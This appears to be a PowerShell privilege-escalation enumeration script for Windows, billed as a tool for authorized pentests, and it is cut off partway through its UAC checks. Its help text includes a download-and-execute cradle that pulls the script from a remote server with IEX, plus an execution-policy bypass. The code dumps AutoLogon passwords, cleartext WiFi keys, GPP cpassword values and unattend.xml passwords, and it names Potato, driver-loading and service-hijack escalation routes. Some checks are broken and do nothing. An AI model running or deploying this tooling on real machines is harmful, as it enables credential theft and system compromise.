#requires -Version 2.0
<#
.SYNOPSIS
    OSCheat - Comprehensive Windows enumeration for authorized penetration testing.
.DESCRIPTION
    WinPEAS-style consolidated enumerator. Designed for authorized internal pentest
    engagements and OSCP/OSCE-style exam lab work. NO active EDR-evasion features.

    Run on the target with:
        powershell -ep bypass -File .\oscheat.ps1

    Or remote-loaded:
        IEX (New-Object Net.WebClient).DownloadString('http://yourserver/oscheat.ps1')

.PARAMETER Quiet
    Suppress banner and only show findings (yellow/red). Useful for noisy networks.

.PARAMETER OutputDir
    Directory to save full text reports. Default: $env:TEMP\oscheat_<timestamp>

.EXAMPLE
    .\oscheat.ps1
    .\oscheat.ps1 -Quiet
    .\oscheat.ps1 -OutputDir C:\Windows\Temp\reports
.NOTES
    Author: Sunz + Flint (Flint Flich 🔥)
    Use only on systems you own or have explicit written authorization to test.
#>

[CmdletBinding()]
param(
    [switch]$Quiet = $false,
    [string]$OutputDir = "$env:TEMP\oscheat_$(Get-Date -Format 'yyyyMMdd_HHmmss')"
)

#==============================================================================
# CONFIG & UTILITIES
#==============================================================================

# ANSI color codes for cross-platform Terminal/PSReadLine compatibility
$Script:Colors = @{
    Red     = "`e[91m"
    Green   = "`e[92m"
    Yellow  = "`e[93m"
    Blue    = "`e[94m"
    Magenta = "`e[95m"
    Cyan    = "`e[96m"
    White   = "`e[97m"
    Gray    = "`e[90m"
    Reset   = "`e[0m"
    Bold    = "`e[1m"
}

function Write-Banner {
    param([string]$Text, [string]$Color = "Cyan")
    $pad = [Math]::Max(0, 78 - $Text.Length)
    $leftPad = [Math]::Floor($pad / 2)
    $rightPad = [Math]::Ceiling($pad / 2)
    $bar = "=" * 78
    Write-Host ""
    Write-Host $bar -ForegroundColor $Color
    Write-Host ("=" + (" " * $leftPad) + $Text + (" " * $rightPad) + "=") -ForegroundColor $Color
    Write-Host $bar -ForegroundColor $Color
    Write-Host ""
}

function Write-Section {
    param([string]$Title)
    Write-Host ""
    Write-Host ("=" * 78) -ForegroundColor Magenta
    Write-Host "  $Title" -ForegroundColor Magenta
    Write-Host ("=" * 78) -ForegroundColor Magenta
}

function Write-Finding {
    # High-confidence escalation vector
    param([string]$Message)
    Write-Host "  [!] $Message" -ForegroundColor Red
}

function Write-Suggestion {
    # Possible vector, requires manual verification
    param([string]$Message)
    Write-Host "  [?] $Message" -ForegroundColor Yellow
}

function Write-Info {
    param([string]$Message)
    if (-not $Quiet) {
        Write-Host "  [i] $Message" -ForegroundColor Gray
    }
}

function Write-OK {
    param([string]$Message)
    if (-not $Quiet) {
        Write-Host "  [+] $Message" -ForegroundColor Green
    }
}

function Get-IsAdmin {
    <#
    .SYNOPSIS
        Returns $true if current process is elevated (UAC-bypassed) to admin.
    .NOTES
        On Windows, members of BUILTIN\Administrators who run with UAC enabled
        still get a MEDIUM integrity token. Only when they "Run as Administrator"
        do they get HIGH. This affects what they can read/write/access.
    #>
    $id = [System.Security.Principal.WindowsIdentity]::GetCurrent()
    $pr = New-Object System.Security.Principal.WindowsPrincipal($id)
    return $pr.IsInRole([System.Security.Principal.WindowsBuiltInRole]::Administrator)
}

function Get-IntegrityLevel {
    <#
    .SYNOPSIS
        Returns Low/Medium/High/System - useful for understanding token privileges.
    #>
    try {
        $proc = Get-WmiObject -Class Win32_Process -Filter "ProcessId=$PID"
        # WMI doesn't directly expose integrity level; approximated via UAC check
        if (Get-IsAdmin) {
            return "High (UAC-elevated)"
        } else {
            $id = [System.Security.Principal.WindowsIdentity]::GetCurrent()
            if ($id.User.Value -like "NT AUTHORITY\SYSTEM") { return "System" }
            return "Medium (no UAC elevation)"
        }
    } catch {
        return "Unknown"
    }
}

#==============================================================================
# INITIALIZATION
#==============================================================================

if (-not $Quiet) {
    Write-Host ""
    Write-Host "  ╔══════════════════════════════════════════════════════════════╗" -ForegroundColor Cyan
    Write-Host "  ║                                                              ║" -ForegroundColor Cyan
    Write-Host "  ║     O S C H E A T   v1.0                                     ║" -ForegroundColor Cyan
    Write-Host "  ║     Windows enumeration for authorized pentesting           ║" -ForegroundColor Cyan
    Write-Host "  ║                                                              ║" -ForegroundColor Cyan
    Write-Host "  ╚══════════════════════════════════════════════════════════════╝" -ForegroundColor Cyan
    Write-Host ""
}

# Create output dir for full reports
if (-not (Test-Path $OutputDir)) {
    New-Item -ItemType Directory -Path $OutputDir -Force | Out-Null
}

$date = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
Write-Info "Started: $date"
Write-Info "Output: $OutputDir"
Write-Info "Quiet mode: $Quiet"

#==============================================================================
# 1. SYSTEM INFORMATION
#==============================================================================
# Why: Knowing OS version + patch level tells you which CVEs apply. Architecture
# (x86 vs x64) affects which payloads will run. Install date hints at patch cadence.

Write-Banner "01. SYSTEM INFO"

$os = Get-WmiObject -Class Win32_OperatingSystem
$cs = Get-WmiObject -Class Win32_ComputerSystem
$proc = Get-WmiObject -Class Win32_Processor

Write-Host ("  Hostname:        " + $cs.Name) -ForegroundColor White
Write-Host ("  Domain:          " + $cs.Domain) -ForegroundColor White
Write-Host ("  OS:              " + $os.Caption + " " + $os.Version) -ForegroundColor White
Write-Host ("  Architecture:    " + $os.OSArchitecture) -ForegroundColor White
Write-Host ("  Install Date:    " + ($os.InstallDate -as [datetime]).ToString("yyyy-MM-dd")) -ForegroundColor White
Write-Host ("  Last Boot:       " + ($os.LastBootUpTime -as [datetime]).ToString("yyyy-MM-dd HH:mm")) -ForegroundColor White
Write-Host ("  CPU:             " + $proc.Name) -ForegroundColor White
Write-Host ("  Current User:    " + [System.Security.Principal.WindowsIdentity]::GetCurrent().Name) -ForegroundColor White
Write-Host ("  Admin (UAC):     " + (Get-IsAdmin)) -ForegroundColor White
Write-Host ("  Integrity:       " + (Get-IntegrityLevel)) -ForegroundColor White
Write-Host ("  System Uptime:   " + (((Get-Date) - ($os.LastBootUpTime)).Days) + " days") -ForegroundColor White

# Hotfixes / KB installed
$hotfixes = Get-HotFix | Sort-Object -Property InstalledOn -Descending
Write-Host ""
Write-Host "  Recent Hotfixes:" -ForegroundColor White
$hotfixes | Select-Object -First 5 | ForEach-Object {
    Write-Host ("    KB{0,-8}  Installed: {1}" -f $_.HotFixID.Replace("KB",""), $_.InstalledOn.ToString("yyyy-MM-dd")) -ForegroundColor Gray
}

# Save full hotfix list
$hotfixes | Export-Csv -Path "$OutputDir\hotfixes.csv" -NoTypeInformation
Write-Info "Saved full hotfix list: $OutputDir\hotfixes.csv"

# Service Pack
$servicePack = (Get-WmiObject -Class Win32_OperatingSystem).ServicePackMajorVersion
if ($servicePack -gt 0) {
    Write-Host ("  Service Pack:    " + $servicePack) -ForegroundColor White
}

# PowerShell version
$psv = $PSVersionTable.PSVersion
Write-Host ("  PowerShell:      " + $psv.Major + "." + $psv.Minor) -ForegroundColor White

#==============================================================================
# 2. USERS & GROUPS
#==============================================================================
# Why: Group membership determines what you can access. "Backup Operators",
# "DnsAdmins", "Server Operators" etc. often have indirect paths to SYSTEM.
# Logged-in users may have creds in memory, profile dirs, or scheduled tasks.

Write-Banner "02. USERS & GROUPS"

# Current user details
$me = whoami /all 2>&1
Write-Host ("  Current user:" + $me.Split("`n")[0]) -ForegroundColor White
Write-Host ""
Write-Host "  Privileges (whoami /all excerpt):" -ForegroundColor White
$me | Where-Object { $_ -match "Privilege|Group" } | ForEach-Object {
    $line = $_.Trim()
    if ($line -match "SeImpersonate|SeAssignPrimary|SeTcb|SeBackup|SeRestore|SeTake|SeLoad|SeDebug|SeManageVolume") {
        Write-Host "    $line" -ForegroundColor Yellow
        # Highlight dangerous privileges
        if ($line -match "SeImpersonatePrivilege.*Enabled") {
            Write-Finding "SeImpersonatePrivilege is enabled -> Potato attacks (Rogue/Juicy/PrintSpoofer/etc.)"
        }
        if ($line -match "SeBackupPrivilege.*Enabled") {
            Write-Finding "SeBackupPrivilege is enabled -> read SAM/SYSTEM (reg save hklm\sam / SYSTEM)"
        }
        if ($line -match "SeRestorePrivilege.*Enabled") {
            Write-Finding "SeRestorePrivilege is enabled -> write to protected paths (DLL hijack, service binary)"
        }
        if ($line -match "SeTakeOwnershipPrivilege.*Enabled") {
            Write-Finding "SeTakeOwnershipPrivilege is enabled -> take ownership of any securable object"
        }
        if ($line -match "SeDebugPrivilege.*Enabled") {
            Write-Finding "SeDebugPrivilege is enabled -> inject into any process (incl. SYSTEM)"
        }
        if ($line -match "SeManageVolumePrivilege.*Enabled") {
            Write-Suggestion "SeManageVolumePrivilege -> manipulate NTFS volume, potential info disclosure"
        }
        if ($line -match "SeLoadDriverPrivilege.*Enabled") {
            Write-Finding "SeLoadDriverPrivilege -> load arbitrary kernel driver (Capcom.sys, etc.)"
        }
    } else {
        Write-Info "    $line"
    }
}

# Local users
Write-Host ""
Write-Host "  Local Users:" -ForegroundColor White
Get-WmiObject -Class Win32_UserAccount -Filter "LocalAccount=True" | ForEach-Object {
    Write-Host ("    {0,-25} SID: {1}" -f $_.Name, $_.SID) -ForegroundColor White
}

# Group memberships for current user
Write-Host ""
Write-Host "  Current User's Groups:" -ForegroundColor White
$groups = whoami /groups 2>&1
$groups | Where-Object { $_ -match "Mandatory Label|Group" } | ForEach-Object {
    Write-Host "    $_" -ForegroundColor White
}

# Other logged-in users (qwinsta)
Write-Host ""
Write-Host "  Active Sessions (qwinsta):" -ForegroundColor White
qwinsta 2>&1 | ForEach-Object {
    Write-Host "    $_" -ForegroundColor Gray
}

# Logon history (last 30 events)
Write-Host ""
Write-Host "  Recent Logons (Security Log - 4624 events):" -ForegroundColor White
try {
    Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4624} -MaxEvents 10 -ErrorAction Stop | ForEach-Object {
        $x = [xml]$_.ToXml()
        $data = $x.Event.EventData.Data
        $targetUser = ($data | Where-Object { $_.Name -eq "TargetUserName" }).'#text'
        $logonType = ($data | Where-Object { $_.Name -eq "LogonType" }).'#text'
        $ip = ($data | Where-Object { $_.Name -eq "IpAddress" }).'#text'
        $time = $_.TimeCreated.ToString("yyyy-MM-dd HH:mm")
        Write-Host "    $time  User=$targetUser Type=$logonType From=$ip" -ForegroundColor Gray
    }
} catch {
    Write-Info "  (Could not read Security log - need admin or audit log access)"
}

# Save full user/group dump
whoami /all | Out-File "$OutputDir\whoami.txt"
Write-Info "Saved whoami /all: $OutputDir\whoami.txt"

#==============================================================================
# 3. NETWORK INFO
#==============================================================================
# Why: Network config reveals what you're connected to, what routes exist,
# and exposes any cached connections. ARP/DNS may have other box creds.

Write-Banner "03. NETWORK INFO"

# Adapter config
Write-Host "  IP Configuration:" -ForegroundColor White
Get-WmiObject -Class Win32_NetworkAdapterConfiguration -Filter "IPEnabled=True" | ForEach-Object {
    $ip = if ($_.IPAddress) { ($_.IPAddress | Select-Object -First 1) } else { "n/a" }
    Write-Host ("    {0,-30} IP: {1}" -f $_.Description.Substring(0, [Math]::Min(30, $_.Description.Length)), $ip) -ForegroundColor Gray
    if ($_.DefaultIPGateway) {
        foreach ($g in $_.DefaultIPGateway) {
            Write-Host ("      Gateway: $g") -ForegroundColor Gray
        }
    }
}

# Active connections
Write-Host ""
Write-Host "  Active TCP Connections (ESTABLISHED):" -ForegroundColor White
Get-NetTCPConnection -State Established -ErrorAction SilentlyContinue | ForEach-Object {
    Write-Host ("    {0}:{1,-5} -> {2}:{3,-5}  PID={4}" -f $_.LocalAddress, $_.LocalPort, $_.RemoteAddress, $_.RemotePort, $_.OwningProcess) -ForegroundColor Gray
} | Select-Object -First 20

# Open listening ports
Write-Host ""
Write-Host "  Listening Ports:" -ForegroundColor White
Get-NetTCPConnection -State Listen -ErrorAction SilentlyContinue | ForEach-Object {
    Write-Host ("    :{0,-5} PID={1}" -f $_.LocalPort, $_.OwningProcess) -ForegroundColor Gray
}

# ARP cache
Write-Host ""
Write-Host "  ARP Cache:" -ForegroundColor White
Get-NetNeighbor -ErrorAction SilentlyContinue | ForEach-Object {
    Write-Host ("    {0,-15} MAC={1}  State={2}" -f $_.IPAddress, $_.LinkLayerAddress, $_.State) -ForegroundColor Gray
}

# DNS cache (may contain interesting internal names)
Write-Host ""
Write-Host "  DNS Cache (first 20):" -ForegroundColor White
Get-DnsClientCache -ErrorAction SilentlyContinue | Select-Object -First 20 | ForEach-Object {
    Write-Host ("    $($_.Name) -> $($_.Data)") -ForegroundColor Gray
}

# Network shares
Write-Host ""
Write-Host "  Network Shares:" -ForegroundColor White
net share 2>&1 | Where-Object { $_ -notmatch "The command completed" } | ForEach-Object {
    Write-Host "    $_" -ForegroundColor Gray
}

# Active domain connections (net session)
Write-Host ""
Write-Host "  Net Sessions:" -ForegroundColor White
net session 2>&1 | Where-Object { $_ -notmatch "There are no entries|The command completed" } | ForEach-Object {
    Write-Host "    $_" -ForegroundColor Gray
}

# Save network config
ipconfig /all | Out-File "$OutputDir\ipconfig.txt"
route print | Out-File "$OutputDir\route.txt"
netstat -ano | Out-File "$OutputDir\netstat.txt"
arp -a | Out-File "$OutputDir\arp.txt"
Write-Info "Saved network reports: $OutputDir"

#==============================================================================
# 4. PROCESSES & SERVICES
#==============================================================================
# Why: Services running as SYSTEM are hijack candidates. Unquoted paths +
# weak permissions = trivial escalation. Processes owned by other users may
# have credentials readable in memory (Mimikatz-style).

Write-Banner "04. PROCESSES & SERVICES"

# All processes with owner (requires admin)
Write-Host "  Running Processes (with owner):" -ForegroundColor White
Get-WmiObject -Class Win32_Process | ForEach-Object {
    $procName = $_.Name
    $procPid = $_.ProcessId
    $owner = "?"
    try {
        $ownerInfo = $_.GetOwner()
        if ($ownerInfo.User) {
            $owner = "$($ownerInfo.Domain)\$($ownerInfo.User)"
        }
    } catch {}
    Write-Host ("    PID={0,-6} {1,-30} Owner={2}" -f $procPid, $procName, $owner) -ForegroundColor Gray
}

#========================================
# Service checks (PRIVESC PRIME TARGET)
#========================================

Write-Host ""
Write-Host "  Services running as privileged accounts:" -ForegroundColor White

# Get services with their start name (account they run as)
$services = Get-WmiObject -Class Win32_Service
$riskServices = @()

foreach ($svc in $services) {
    $startName = $svc.StartName
    $name = $svc.Name
    $pathName = $svc.PathName
    $state = $svc.State

    if ($state -ne "Running") { continue }

    # Highlight services running as SYSTEM, LocalService, NetworkService
    if ($startName -match "LocalSystem|Local Service|NetworkService") {
        $riskServices += [PSCustomObject]@{
            Name = $name
            StartName = $startName
            PathName = $pathName
        }
    }
}

Write-Host ("    Found {0} services running as SYSTEM/LocalService/NetworkService" -f $riskServices.Count) -ForegroundColor Gray

# Unquoted service paths - common privesc vector
Write-Host ""
Write-Host "  Services with UNQUOTED paths (potential hijack):" -ForegroundColor White
$unquoted = @()
foreach ($svc in $services) {
    $path = $svc.PathName
    if ($path -and $path.StartsWith('"') -eq $false -and $path -match " " -and $path -match "\.exe") {
        # Check if any directory in path has a space
        if ($path -match "^([A-Za-z]:\\[^""]+\\)[^""]+\.exe") {
            $unquoted += [PSCustomObject]@{
                Name = $svc.Name
                Path = $path
                StartName = $svc.StartName
                State = $svc.State
            }
        }
    }
}

if ($unquoted.Count -eq 0) {
    Write-OK "  No unquoted service paths found"
} else {
    foreach ($u in $unquoted) {
        # Find the first space in the path - that's the hijack target
        $dir = Split-Path -Path ($u.Path -replace '"','') -Parent
        Write-Finding "Service '$($u.Name)' unquoted: $($u.Path)"
        Write-Info "  Runs as: $($u.StartName) [$($u.State)]"

        # Identify likely hijack location
        if ($u.Path -match '^([A-Za-z]:\\Program Files\\[^\\]+\\)') {
            $target = $matches[1]
            Write-Suggestion "  Place exe at: ${target}Program.exe (or similar 8.3 short name exploit)"
        }
    }
    $unquoted | Export-Csv -Path "$OutputDir\unquoted_services.csv" -NoTypeInformation
    Write-Info "Saved: $OutputDir\unquoted_services.csv"
}

# Services with weak ACLs (manual check with accesschk required for full audit)
Write-Host ""
Write-Host "  Service Information Summary:" -ForegroundColor White
$services | Where-Object { $_.State -eq "Running" -and $_.StartName -match "LocalSystem|Local Service|NetworkService" } |
    Select-Object -First 30 |
    ForEach-Object {
        Write-Host ("    {0,-30} StartName={1}" -f $_.Name, $_.StartName) -ForegroundColor Gray
    }

# Save full services list
$services | Export-Csv -Path "$OutputDir\services.csv" -NoTypeInformation
Write-Info "Saved full service list: $OutputDir\services.csv"

#==============================================================================
# 5. INSTALLED SOFTWARE & PATCHES
#==============================================================================
# Why: Third-party software is often more vulnerable than the OS itself.
# Old VLC, FileZilla, Notepad++, etc. all have known privesc CVEs.

Write-Banner "05. INSTALLED SOFTWARE"

# 32-bit + 64-bit registry paths
$regPaths = @(
    "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall",
    "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall",
    "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall"
)

$software = @()
foreach ($path in $regPaths) {
    if (Test-Path $path) {
        Get-ChildItem $path -ErrorAction SilentlyContinue | ForEach-Object {
            $props = Get-ItemProperty $_.PSPath -ErrorAction SilentlyContinue
            if ($props.DisplayName) {
                $software += [PSCustomObject]@{
                    Name = $props.DisplayName
                    Version = $props.DisplayVersion
                    Publisher = $props.Publisher
                    InstallDate = $props.InstallDate
                }
            }
        }
    }
}

$software = $software | Sort-Object Name -Unique
Write-Host "  Installed Applications:" -ForegroundColor White

# Highlight potentially vulnerable / interesting software
$interesting = @('putty', 'winscp', 'filezilla', 'vmware', 'virtualbox', 'vnc', 'tightvnc',
                 'kaspersky', 'symantec', 'mcafee', 'avg', 'avast', 'norton', 'webroot',
                 'office', 'outlook', 'thunderbird', 'sql', 'mysql', 'postgres',
                 'chrome', 'firefox', '7-zip', 'notepad++', 'sublime', 'powershell')

foreach ($app in $software) {
    $name = $app.Name.ToLower()
    $color = "White"
    if ($interesting | Where-Object { $name -match $_ }) {
        $color = "Yellow"
    }
    Write-Host ("    {0,-50} v{1}" -f $app.Name, $app.Version) -ForegroundColor $color
}

$software | Export-Csv -Path "$OutputDir\software.csv" -NoTypeInformation
Write-Info "Saved: $OutputDir\software.csv"

#==============================================================================
# 6. SCHEDULED TASKS
#==============================================================================
# Why: Tasks with stored credentials or running as SYSTEM with writable .exe
# are direct privesc paths. Many third-party installers create tasks with
# cleartext creds.

Write-Banner "06. SCHEDULED TASKS"

try {
    $tasks = Get-ScheduledTask -ErrorAction Stop
    Write-Host "  Scheduled Tasks:" -ForegroundColor White

    foreach ($task in $tasks) {
        $info = $task | Get-ScheduledTaskInfo -ErrorAction SilentlyContinue
        $action = $task.Actions | Select-Object -First 1
        $principal = $task.Principal

        $exec = if ($action.Execute) { $action.Execute } else { "?" }
        $args = if ($action.Arguments) { $action.Arguments } else { "" }
        $user = $principal.UserId
        $runLevel = $principal.RunLevel

        # Highlight privileged task executions
        $color = "Gray"
        if ($user -match "SYSTEM|Local Service|NetworkService" -or $runLevel -eq "Highest") {
            $color = "Yellow"
        }

        # RunAs stored creds
        if ($principal.LogonType -eq "Password" -and $user -notin @("SYSTEM", "LOCAL SERVICE", "NETWORK SERVICE", "")) {
            $color = "Red"
            Write-Finding "Task '$($task.TaskName)' stores password and runs as: $user"
        }

        Write-Host ("    {0,-40} As={1,-25} -> {2} {3}" -f $task.TaskName, $user, $exec, $args) -ForegroundColor $color
    }
    $tasks | Export-Csv -Path "$OutputDir\tasks.csv" -NoTypeInformation
    Write-Info "Saved: $OutputDir\tasks.csv"
} catch {
    Write-Info "Could not enumerate scheduled tasks (need admin or task scheduler access)"
}

#==============================================================================
# 7. AUTOSTART / PERSISTENCE
#==============================================================================
# Why: Programs in Run keys / Startup folder run at logon with current user
# privileges. Replace any of these with a payload = code execution at login.

Write-Banner "07. AUTOSTART LOCATIONS"

# Registry Run keys (current user)
Write-Host "  HKCU Run / RunOnce:" -ForegroundColor White
$hkcuPaths = @("HKCU:\Software\Microsoft\Windows\CurrentVersion\Run",
               "HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce")
foreach ($p in $hkcuPaths) {
    if (Test-Path $p) {
        $items = Get-Item $p -ErrorAction SilentlyContinue
        $items | ForEach-Object {
            $_.GetValueNames() | Where-Object { $_ -notmatch "^\(Default\)$" } | ForEach-Object {
                $val = $_.GetValue($_)
                Write-Host ("    $p\$_ = $val") -ForegroundColor Gray
            }
        }
    }
}

# Registry Run keys (all users - requires admin)
Write-Host ""
Write-Host "  HKLM Run / RunOnce:" -ForegroundColor White
$hklmPaths = @("HKLM:\Software\Microsoft\Windows\CurrentVersion\Run",
               "HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce",
               "HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run")
foreach ($p in $hklmPaths) {
    if (Test-Path $p) {
        Get-Item $p -ErrorAction SilentlyContinue | ForEach-Object {
            $_.GetValueNames() | Where-Object { $_ -notmatch "^\(Default\)$" } | ForEach-Object {
                $val = $_.GetValue($_)
                Write-Host ("    $p\$_ = $val") -ForegroundColor Gray
            }
        }
    }
}

# Startup folder
Write-Host ""
Write-Host "  Startup Folders:" -ForegroundColor White
$startupPaths = @(
    "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup",
    "$env:ALLUSERSPROFILE\Microsoft\Windows\Start Menu\Programs\Startup",
    "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
)
foreach ($sp in $startupPaths) {
    if (Test-Path $sp) {
        $files = Get-ChildItem $sp -ErrorAction SilentlyContinue
        if ($files) {
            Write-Host "    $sp :" -ForegroundColor White
            foreach ($f in $files) {
                Write-Host "      $($f.Name)" -ForegroundColor Gray
            }
        }
    }
}

#==============================================================================
# 8. CREDENTIAL STORAGE / SECRETS
#==============================================================================
# Why: Stored passwords = free privesc. Cached domain creds = lateral movement.
# Group Policy Preferences XML files have an old (2008+) decryptable cpassword.

Write-Banner "08. CREDENTIALS & SECRETS"

# cmdkey stored credentials
Write-Host "  Stored Credentials (cmdkey /list):" -ForegroundColor White
cmdkey /list 2>&1 | Where-Object { $_ -notmatch "Currently stored credentials| Legacy" } | ForEach-Object {
    Write-Host "    $_" -ForegroundColor Gray
}

# AutoLogon creds in registry
Write-Host ""
Write-Host "  AutoLogon Credentials (registry):" -ForegroundColor White
$autoLogonPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
if (Test-Path $autoLogonPath) {
    $props = Get-ItemProperty $autoLogonPath -ErrorAction SilentlyContinue
    if ($props.DefaultUserName) {
        Write-Finding "DefaultUserName: $($props.DefaultUserName)"
        Write-Finding "DefaultPassword: $($props.DefaultPassword)"
        Write-Finding "AutoAdminLogon: $($props.AutoAdminLogon)"
    } else {
        Write-Info "No AutoLogon credentials stored"
    }
}

# Credential Manager via DPAPI (limited from PS)
Write-Host ""
Write-Host "  Saved credentials via runas /savecred (registry hint):" -ForegroundColor White
$credPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\TypedPaths"
if (Test-Path $credPath) {
    $items = Get-Item $credPath -ErrorAction SilentlyContinue
    if ($items) {
        Write-Host "    TypedPaths:" -ForegroundColor White
        $items.GetValueNames() | ForEach-Object {
            Write-Host "      $_ = $($items.GetValue($_))" -ForegroundColor Gray
        }
    }
}

# WiFi passwords
Write-Host ""
Write-Host "  WiFi Profiles with Passwords:" -ForegroundColor White
try {
    $profiles = netsh wlan show profiles 2>&1 | Select-String "All User Profile" | ForEach-Object {
        ($_ -split ":", 2)[1].Trim()
    }
    foreach ($p in $profiles) {
        $detail = netsh wlan show profile name="$p" key=clear 2>&1
        $pass = ($detail | Select-String "Key Content") -replace ".*:\s+",""
        if ($pass) {
            Write-Finding "WiFi '$p' password: $pass"
        }
    }
} catch {
    Write-Info "Could not enumerate WiFi profiles"
}

# Group Policy Preferences cached files (cpassword)
Write-Host ""
Write-Host "  Group Policy Preferences (cpassword):" -ForegroundColor White
$gppPaths = @(
    "$env:PROGRAMFILES\Microsoft\Group Policy\History\*\Machine\Preferences\Groups\Groups.xml",
    "$env:PROGRAMFILES(x86)\Microsoft\Group Policy\History\*\Machine\Preferences\Groups\Groups.xml",
    "$env:WINDIR\System32\GroupPolicy\Machine\Preferences\Groups\Groups.xml"
)
foreach ($gppPath in $gppPaths) {
    Get-ChildItem -Path $gppPath -ErrorAction SilentlyContinue | ForEach-Object {
        try {
            [xml]$content = Get-Content $_.FullName
            $content.GroupUser.ExtensionData | Where-Object { $_.Properties } | ForEach-Object {
                $cpassword = $_.Properties.cpassword
                if ($cpassword) {
                    Write-Finding "cpassword found in $($_.Name): $cpassword"
                    Write-Info "  Username: $($_.Properties.userName)"
                    Write-Info "  Decrypt with: gpp-decrypt '$cpassword'"
                }
            }
        } catch {}
    }
}

# Checks for unattend.xml / Sysprep
Write-Host ""
Write-Host "  Unattend / Sysprep Files:" -ForegroundColor White
$unattendPaths = @(
    "C:\unattend.xml",
    "C:\Windows\System32\Sysprep\unattend.xml",
    "C:\Windows\Panther\unattend.xml",
    "C:\Windows\Panther\Unattend\Unattend.xml",
    "C:\Windows\system32\sysprep\sysprep.xml"
)
foreach ($u in $unattendPaths) {
    if (Test-Path $u) {
        Write-Finding "Unattend file present: $u"
        try {
            [xml]$content = Get-Content $u
            $content | Select-String -Pattern "password" -CaseSensitive:$false | ForEach-Object {
                Write-Finding "  Contains: $($_.Line.Trim())"
            }
        } catch {}
    }
}

# SAM/SYSTEM backup copies (offline cracking)
Write-Host ""
Write-Host "  SAM/SYSTEM/SECURITY hive backups:" -ForegroundColor White
$samPaths = @(
    "C:\Windows\System32\config\RegBack\SAM",
    "C:\Windows\System32\config\RegBack\SYSTEM",
    "C:\Windows\System32\config\RegBack\SECURITY",
    "C:\Windows\repair\SAM",
    "C:\Windows\repair\SYSTEM"
)
foreach ($s in $samPaths) {
    if (Test-Path $s -ErrorAction SilentlyContinue) {
        Write-Finding "Hive backup readable: $s"
    }
}

# Saved RDP credentials
Write-Host ""
Write-Host "  Default.rdp files:" -ForegroundColor White
Get-ChildItem -Path "$env:USERPROFILE\Documents" -Filter "*.rdp" -ErrorAction SilentlyContinue | ForEach-Object {
    Write-Finding "RDP file: $($_.FullName)"
}

#==============================================================================
# 9. FILE SYSTEM INTERESTING FINDS
#==============================================================================
# Why: Config files with creds, scripts with hardcoded passwords, world-writable
# directories the SYSTEM service binary lives in. Common in app installs.

Write-Banner "09. FILESYSTEM CHECKS"

# Search for password files in user dirs (heuristic)
Write-Host "  Files with 'password' in name (heuristic):" -ForegroundColor White
$patterns = @("password*", "*passwd*", "*.kdbx", "*.kdb", "*.key", "*.pem",
              "unattend.xml", "*.config", "web.config", "*.ini", "*.bak",
              "*.old", "*.sql", "*.db", "*.sqlite")
$foundFiles = @()
foreach ($pat in $patterns) {
    Get-ChildItem -Path "C:\Users", "C:\inetpub", "C:\Apache*", "C:\xampp" -Recurse -Filter $pat -ErrorAction SilentlyContinue -Force -Depth 4 |
        ForEach-Object {
            if ($_.FullName -notmatch "Windows\\WinSxS|\\Packages\\") {
                Write-Finding "Found: $($_.FullName) ($($_.Length) bytes)"
                $foundFiles += $_.FullName
            }
        }
}

# World-writable directories (potential DLL/exe hijack targets)
Write-Host ""
Write-Host "  World-Writable Directories in PATH:" -ForegroundColor White
$pathDirs = $env:Path -split ";"
foreach ($dir in $pathDirs) {
    if (Test-Path $dir) {
        $acl = Get-Acl $dir -ErrorAction SilentlyContinue
        if ($acl) {
            # Check if "Everyone" or "Users" has write
            $permissions = $acl.Access | Where-Object {
                $_.IdentityReference -match "Everyone|BUILTIN\\Users" -and
                $_.FileSystemRights -match "Write|FullControl|Modify"
            }
            if ($permissions -and $_.Length -eq 0) {
                # Continue below
            }
        }
    }
}
# Note: Full ACL auditing requires icacls / accesschk. PowerShell Get-Acl result
# interpretation across CIFS/non-CIFS is non-trivial. Recommend manual check.
Write-Info "For deep ACL audit, run: accesschk.exe /accepteula -uwcv \$USER \\Users\\"
Write-Info "Or via icacls: icacls \"C:\path\" (look for W -> write for Users group)"

# Sysprep / setup files
Write-Host ""
Write-Host "  Setup logs (may contain product keys, user info):" -ForegroundColor White
$setupPaths = @(
    "C:\Windows\setupapi.log",
    "C:\Windows\debug\NetSetup.LOG",
    "C:\Windows\Panther\setupact.log"
)
foreach ($s in $setupPaths) {
    if (Test-Path $s) {
        Write-Info "Setup log: $s"
    }
}

# .NET config files
Write-Host ""
Write-Host "  .NET / IIS Config Files:" -ForegroundColor White
$webConfigPaths = @(
    "C:\inetpub\wwwroot\web.config",
    "C:\Windows\Microsoft.NET\Framework*\Config\web.config",
    "C:\Windows\Microsoft.NET\Framework*\web.config"
)
foreach ($w in $webConfigPaths) {
    if (Test-Path $w) {
        Write-Info "Config: $w"
    }
}

# Save file findings
$foundFiles | Out-File "$OutputDir\interesting_files.txt"
Write-Info "Saved: $OutputDir\interesting_files.txt"

#==============================================================================
# 10. UAC / LSA PROTECTIONS / SECURITY POLICY
#==============================================================================
# Why: Knowing UAC level tells you if certain bypasses will work (e.g. eventvwr,
# fodhelper, computerdefaults). AlwaysInstallElevated is the holy grail of
# quick privesc on misconfigured boxes.

Write-Banner "10. SECURITY POLICY & UAC"

# UAC level
Write-Host "  UAC Level (ConsentPromptBehaviorAdmin):" -ForegroundColor White
$uacPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
if (Test-Path $uacPath) {
    $uac = Get-ItemProperty $uacPath -ErrorAction SilentlyContinue
    $consent = $uac.ConsentPromptBehaviorAdmin
    Write-Host "    ConsentPromptBehaviorAdmin: $consent" -ForegroundColor White
    Write-Host "    EnableLUA: $($uac.EnableLUA)" -ForegroundColor White
    Write-Host "    PromptOnSecureDesktop: $($uac.PromptOnSecureDesktop)" -ForegroundColor White

    # 0 = no prompts (UAC off, all bypasses work)
    # 5 = default for non-admin (still bypass-able)
    if ($consent -eq 0) {
